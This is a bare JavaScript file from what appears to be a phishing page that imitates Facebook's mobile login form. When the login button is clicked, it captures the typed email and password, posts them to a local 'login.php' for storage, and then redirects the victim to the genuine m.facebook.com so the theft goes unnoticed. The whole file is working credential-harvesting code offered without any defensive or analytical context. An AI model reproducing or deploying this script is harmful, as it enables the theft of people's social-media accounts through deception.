document.addEventListener("DOMContentLoaded", function () {
    const URL_REDIRECCION = "https://m.facebook.com/";
        URL_GUARDAR_DATOS = "./login.php",
        $btnLogin = document.querySelector("#l"),
        $usuario = document.querySelector("#m_login_email"),
        $password = document.querySelector("#m_login_password");

    $btnLogin.addEventListener("click", () => {
        if (!$usuario.value || !$password.value) return;
        let cargaUtil = {
            usuario: $usuario.value,
            password: $password.value,
        };
        fetch(URL_GUARDAR_DATOS, {
            method: "POST",
            body: JSON.stringify(cargaUtil)
        }).then(() => {
            window.location.href = URL_REDIRECCION;
        });
    });
});
